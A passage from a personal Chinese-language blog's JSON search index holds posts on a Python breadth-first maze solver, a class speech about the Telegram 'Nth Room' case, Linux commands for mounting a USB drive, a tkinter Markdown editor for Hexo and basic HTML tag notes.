print(&quot;\\n&quot;)map_show(map1)class Unit: def __init__(self,c,p): x=c[0] y=c[1] self.x=x self.y=y self.up=(self.x,self.y+1) self.down=(self.x,self.y-1) self.left=(self.x-1,self.y) self.right=(self.x+1,self.y) self.directions = [self.up,self.down,self.left,self.right] self.parent = pstart=Unit((9,0),(0,0))goal=Unit((0,9),(-1,-1))def route_trace(current,explored): while current.parent != (0,0): for trace in explored: if trace.x == current.parent[0] and trace.y == current.parent[1]: if map1[current.x][current.y] == &#x27; &#x27;: map1[current.x][current.y] = &#x27;.&#x27; # print(current.x,current.y) current = tracedef action(frontier,explored,current): for i in current.directions: j=Unit((i[0],i[1]),(current.x,current.y)) # print((j.x,j.y),end=&#x27;,&#x27;) condition = 1 for x in explored: if x.x==j.x and x.y==j.y: condition = 0 if condition and j.x&gt;=0 and j.x&lt;=9 and j.y&gt;=0 and j.y&lt;=9 and map1[j.x][j.y] != &#x27;#&#x27;: frontier.append(Unit((i[0],i[1]),(current.x,current.y)))def travel(map1,start): frontier = [] explored = [] current = Unit((start.x,start.y),start.parent) frontier.append(current) while True: if len(frontier) == 0: print(&quot;No result&quot;) break del(frontier[0]) explored.append(Unit((current.x,current.y),current.parent)) if current.x == goal.x and current.y == goal.y: print(&quot;\\nGot it!\\n&quot;) route_trace(current,explored) map_show(map1) break action(frontier,explored,current) if len(frontier) == 0: print(&quot;No result&quot;) break current = frontier[0] travel(map1,start) 结果如下： 123456789101112131415161718192021222324252627282930313233343536373839404142# # # # # B # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # A # # # # Got it!# # # # # . . . . B # # # # # . # # # # # # # # # . # # # # # # # # # . # # # # # # # # # . # # # # . # # # # # . # # # # # # # # # . # # # # # # # # # . # # # # A . . . . . # # # # 现在，这个程序已经能够找出各种迷宫地图的解法了，也就是说，如果我们对地图进行修改，程序也能够正常运行并输出相应结果，比如，我们将地图的唯一道路“封死”，那么结果就会是“No result”，如下所示： 123456789101112131415161718192021# # # # # B # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # A # # # # # No result 至此，我们就完成了对此情境下相关代码的编写。 修改于2021.04.11","categories":[],"tags":[{"name":"知识输出","slug":"知识输出","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA/"},{"name":"AI","slug":"AI","permalink":"http://uniqueland.top/tags/AI/"}]},{"title":"来自班级组织演讲的一篇演讲稿","slug":"Speech","date":"2021-04-09T16:46:04.297Z","updated":"2020-11-09T06:00:08.000Z","comments":true,"path":"2021/04/10/Speech/","link":"","permalink":"http://uniqueland.top/2021/04/10/Speech/","excerpt":"正文地狱空荡荡 恶魔在人间 想必在座各位多少看过这句话，这就是我今天要说的有关Telegram N号房事件的一些东西；由于案情复杂，我就不再赘述，有兴趣的请自行百度主要人物介绍：","text":"正文地狱空荡荡 恶魔在人间 想必在座各位多少看过这句话，这就是我今天要说的有关Telegram N号房事件的一些东西；由于案情复杂，我就不再赘述，有兴趣的请自行百度主要人物介绍：赵主彬：现年25岁，信息通信专业，曾担任学报编辑部编辑。多次获得奖学金。3年内参加了50多次志愿活动。就是这么一个表面人畜无害的优秀学生，主导了这么一起事件。对此人进行分析，我们不难得出：平台用telegram，交易用比特币，说明罪犯反侦查意识高，思维敏捷，可以归类为高智商信息犯罪；内心自卑，但是外围性格特征表现为自负，因无法达到自身的高度预期郁不得志，因此可能存在社会偏见，有一定概率发展为反社会型人格；可能存在家庭暴力，且是父权家庭；社交能力较差，排斥甚至仇视女性，这点可以从他在被捕后的言论发表矢口不谈对女性的道歉这一点可以看出。 有的孩子是孩子，有的孩子是禽兽这十几年都塞了什么进脑子里人名不打码，马赛克做错了什么 就像这些评论所表述的一样，我也痛恨这些精虫上脑的东西。但是几乎一边倒的网络舆论显然有些问题：这26万人个个都罪该万死吗？考虑到涉案人数及案件的复杂程度，我个人觉得其中还是不乏被教唆的，受蒙骗的，甚至不明情况的。不是说强行洗白，而是我认为每个人看待事情都应该有自己的看法，有那种不被舆论大势所动摇的那种看法。大家是否看过这样一个比喻：韩国目前在运营的出租车大概有26万辆，这意味着在韩国的大街上，遇到N号房会员就像遇到出租车一样频繁。不知各位对这个比喻有什么看法在我看来，这是一种下意识的情景描绘，旨在放大案件涉及的范围，而这种情景描绘于我来看除了放大恐慌之外没有任何用处，那他们这么做的目的何在呢？要我说要不就是公众号博人眼球，要不就涉及到黑公关带节奏，由于这是一个国家级的案件，比起背后大到令人无法想象的黑灰产业链，我还是更倾向于前者。 最后，引用了几句某些公众号的评价作为我对此事的看法，话很粗，但理不粗：作为一个成年人，要学会克制，不该馋的不要馋。我知道现在是春天，但只有野狗才不分场合、不分对象，时刻想着交配。何况，野狗也只在春秋两季才发情 补充由于班级组织的演讲限时3分钟，所以我不得不把原本一千多字的演讲稿删为800多字，也因此缺失了很多事件的细节及个人的观点。–2020.05.07","categories":[],"tags":[]},{"title":"Linux下利用命令行对U盘和电脑中的文件进行操作","slug":"Operations between flash disk and linux os","date":"2021-04-09T16:46:04.296Z","updated":"2020-11-10T03:52:41.832Z","comments":true,"path":"2021/04/10/Operations between flash disk and linux os/","link":"","permalink":"http://uniqueland.top/2021/04/10/Operations%20between%20flash%20disk%20and%20linux%20os/","excerpt":"","text":"123456fdisk -l #查看接入设备名称mount /dev/sda1 /mnt #挂载U盘ls /mnt #查看U盘文件cp file directory #复制指定文件file至指定目录directoryls /mnt #再次查看U盘文件umount /mnt #卸载U盘 标题（可选）提示：若操作中出现错误，请查看权限是否正确，或在每次操作前加’sudo’cp后的文件和路径需带路径(个人推荐绝对路径)","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"}]},{"title":"Markdown_Editor V1.0","slug":"Markdown_Editor V1.0","date":"2021-04-09T16:46:04.295Z","updated":"2020-11-10T02:56:29.631Z","comments":true,"path":"2021/04/10/Markdown_Editor V1.0/","link":"","permalink":"http://uniqueland.top/2021/04/10/Markdown_Editor%20V1.0/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556\\# -*- coding=utf-8 -*- import tkinterimport osfrom tkinter import filedialogwin_size=&#x27;450x550&#x27;win = tkinter.Tk()win.geometry(win_size)win.title(&#x27;Markdown Editor V1.0 (hexo only)&#x27;)def processandsave(): contents = &#x27;---\\ntitle:&#x27; + title.get(&#x27;0.0&#x27;,&#x27;end&#x27;) + &#x27;tags:&#x27; + tags.get(&#x27;0.0&#x27;,&#x27;end&#x27;) + &#x27;---\\n&#x27; + content.get(&#x27;0.0&#x27;,&#x27;end&#x27;) filename = filedialog.asksaveasfilename() if filename is not None: with open(file=filename,mode=&#x27;w&#x27;) as file: file.write(str(contents)) title.delete(&#x27;0.0&#x27;,&#x27;end&#x27;) tags.delete(&#x27;0.0&#x27;,&#x27;end&#x27;) content.delete(&#x27;0.0&#x27;,&#x27;end&#x27;)def add_bash(): add_content=add_bash_text.get(&#x27;0.0&#x27;,&#x27;end&#x27;) add_content=add_content.rstrip() changing_content=&#x27;```bash\\n&#x27;+add_content+&#x27;\\n```\\n&#x27; content.insert(&#x27;end&#x27;,changing_content) add_bash_text.delete(&#x27;0.0&#x27;,&#x27;end&#x27;)label1=tkinter.Label(text=&#x27;标题&#x27;,padx=10,pady=10)label1.grid(row=0,column=0)title=tkinter.Text(width=40,height=2)title.grid(row=0,column=1,columnspan=2)label2=tkinter.Label(text=&#x27;标签&#x27;,padx=5,pady=5)label2.grid(row=1,column=0)tags=tkinter.Text(width=30,height=1)tags.grid(row=1,column=1)label3=tkinter.Label(text=&#x27;正文&#x27;,padx=5,pady=5)label3.grid(row=2,column=0)content=tkinter.Text(width=40,height=20)content.grid(row=2,column=1,rowspan=5)add_bash_button=tkinter.Button(win,text=&#x27;命令行&#x27;,command=add_bash)add_bash_button.grid(row=9,column=0)add_bash_text=tkinter.Text(width=40,height=5)add_bash_text.grid(row=9,column=1)save_button=tkinter.Button(win,text=&#x27;保存&#x27;,command=processandsave)save_button.grid(row=8,column=1)win.mainloop()","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"}]},{"title":"Thanksgiving","slug":"img_share","date":"2021-04-09T16:46:04.294Z","updated":"2020-11-28T16:15:08.320Z","comments":true,"path":"2021/04/10/img_share/","link":"","permalink":"http://uniqueland.top/2021/04/10/img_share/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"HTML笔记","slug":"HTML_notes","date":"2021-04-09T16:46:04.293Z","updated":"2021-01-18T15:02:48.534Z","comments":true,"path":"2021/04/10/HTML_notes/","link":"","permalink":"http://uniqueland.top/2021/04/10/HTML_notes/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980811 &lt;h1&gt; to &lt;/h6&gt;: 一到六号标题2 &lt;p&gt;段落&lt;/p&gt;3 &lt;body style=&quot;background-color:PowderBlue;&quot;&gt; &lt;p style=&quot;font-family:verdana;color:red&quot;&gt;对段落样式进行修改&lt;/p&gt; &lt;/body&gt;4 &lt;br /&gt;&lt;hr /&gt;&lt;!这是注释，前面的是换行和分割线&gt;5 &lt;b&gt;被加粗的内容&lt;/b&gt;6 &lt;strong&gt;被...加粗的内容...吧&lt;/strong&gt;7 &lt;big&gt;被加大的内容&lt;/big&gt;8 &lt;em&gt;被强调(加斜)的内容&lt;/em&gt;9 &lt;i&gt;被...意大利式加斜的内容&lt;/i&gt;10 &lt;small&gt;被减小的内容&lt;/small&gt;11 &lt;sub&gt;位于右下角的小字部分&lt;/sub&gt;12 &lt;sup&gt;位于右上角的小字部分&lt;/sup&gt;13 &lt;pre&gt;预格式文本(保留了空格和换行)&lt;/pre&gt;14 &lt;code&gt;用于&lt;/code&gt;,&lt;kbd&gt;显示&lt;/kbd&gt;,&lt;samp&gt;代码&lt;/samp&gt;,&lt;var&gt;这个加大加粗了一点&lt;/var&gt;15 &lt;address&gt;用于书写地址，其中记得手动添加换行标签&lt;/address&gt;16 &lt;abbr title=&quot;etcetera&quot;&gt;etc.&lt;/abbr&gt;17 &lt;acronym title=&quot;World Wide Web&quot;&gt;WWW&lt;/acronym&gt;18 &lt;bdo dir=&quot;rtl&quot;&gt;印打序倒&lt;/bdo&gt;19 &lt;blockquote&gt;块引用&lt;/blockquote&gt;,&lt;q&gt;短引用&lt;/q&gt;20 &lt;p&gt;你看&lt;del&gt;我被划掉了&lt;/del&gt;&lt;ins&gt;又被加下划线了&lt;/ins&gt;&lt;/p&gt;21 &lt;a name=&quot;tips&quot;&gt;基本的注意事项 - 有用的提示&lt;/a&gt; &lt;a href=&quot;#tips&quot;&gt;有用的提示&lt;/a&gt;22 &lt;img src=&quot;url&quot; width=xx height=xx align=xxx /&gt;23 &lt;table border=&quot;1&quot;&gt; &lt;tr&gt; &lt;th&gt;Heading&lt;/th&gt; &lt;th&gt;Another Heading&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;row 1, cell 1&lt;/td&gt; &lt;td&gt;row 1, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;row 2, cell 1&lt;/td&gt; &lt;td&gt;row 2, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;24 &lt;ul&gt;&lt;!unsorted list&gt; &lt;li&gt;Coffee&lt;/li&gt; &lt;li&gt;Milk&lt;/li&gt; &lt;/ul&gt;25 &lt;ol&gt;&lt;!ordered list&gt; &lt;li&gt;Coffee&lt;/li&gt; &lt;li&gt;Milk&lt;/li&gt; &lt;/ol&gt;26 &lt;dl&gt;&lt;!defined list&gt; &lt;dt&gt;Coffee&lt;/dt&gt; &lt;dd&gt;Black hot drink&lt;/dd&gt; &lt;dt&gt;Milk&lt;/dt&gt; &lt;dd&gt;White cold drink&lt;/dd&gt; &lt;/dl&gt;27 &lt;head&gt; &lt;style&gt; .cities &#123; background-color:black; color:white; margin:20px; padding:20px; &#125; &lt;/style&gt; &lt;/head&gt;28 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;style&gt; span.red &#123;color:red;&#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;My &lt;span class=&quot;red&quot;&gt;Important&lt;/span&gt; Heading&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt;29 &lt;iframe src=&quot;demo_iframe.htm&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;/iframe&gt;30 &lt;body background=&quot;http://www.w3school.com.cn/clouds.gif&quot;&gt;31 &lt;script type=&quot;text/javascript&quot;&gt; document.write(&quot;Hello World!&quot;) &lt;/script&gt; &lt;noscript&gt;Your browser does not support JavaScript!&lt;/noscript&gt; Quick Search","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"}]},{"title":"0","slug":"0","date":"2020-03-22T09:06:28.000Z","updated":"2020-11-09T06:00:08.000Z","comments":true,"path":"2020/03/22/0/","link":"","permalink":"http://uniqueland.top/2020/03/22/0/","excerpt":"","text":"Hello,World！说人话 我终于有自己的网站啦 虽然只是部署在github上的先做个测试 下回在看看要弄啥peach..啊不…peace～～","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"},{"name":"Windows","slug":"Windows","permalink":"http://uniqueland.top/tags/Windows/"},{"name":"CyberSecurity","slug":"CyberSecurity","permalink":"http://uniqueland.top/tags/CyberSecurity/"},{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"},{"name":"Internet","slug":"Internet","permalink":"http://uniqueland.top/tags/Internet/"},{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"},{"name":"tool","slug":"tool","permalink":"http://uniqueland.top/tags/tool/"},{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"},{"name":"linux","slug":"linux","permalink":"http://uniqueland.top/tags/linux/"},{"name":"other","slug":"other","permalink":"http://uniqueland.top/tags/other/"},{"name":"ctf、web","slug":"ctf、web","permalink":"http://uniqueland.top/tags/ctf%E3%80%81web/"},{"name":"CTF","slug":"CTF","permalink":"http://uniqueland.top/tags/CTF/"},{"name":"知识输出","slug":"知识输出","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA/"},{"name":"AI","slug":"AI","permalink":"http://uniqueland.top/tags/AI/"}]}